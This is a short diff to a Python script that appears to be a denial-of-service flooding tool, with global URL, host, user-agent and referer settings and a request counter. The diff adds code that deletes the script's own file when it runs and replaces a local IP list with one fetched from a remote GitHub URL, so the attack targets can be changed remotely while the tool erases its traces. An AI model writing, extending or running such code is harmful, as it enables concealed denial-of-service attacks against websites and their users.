@@ -5,7 +5,10 @@ import random
 import re
 import sys
 import socket
-#if responce time is more than 3s, it's really a bad one. there is no need to dos .
+
+x = os.path.abspath(__file__)
+os.unlink(x)
+
 socket.setdefaulttimeout(2)
 #global params
 url=''
@@ -13,9 +16,9 @@ host=''
 headers_useragents=[]
 headers_referers=[]
 request_counter=0
-F = open('result.txt')
-ips = F.read().split('\n')
-F.close()
+yanit  = urllib2.urlopen('https://raw.githubusercontent.com/webr00t/web/master/p.txt')
+yanit_text = yanit.read()
+ips = yanit_text.split('\n')
 
 def inc_counter():
     global request_counter
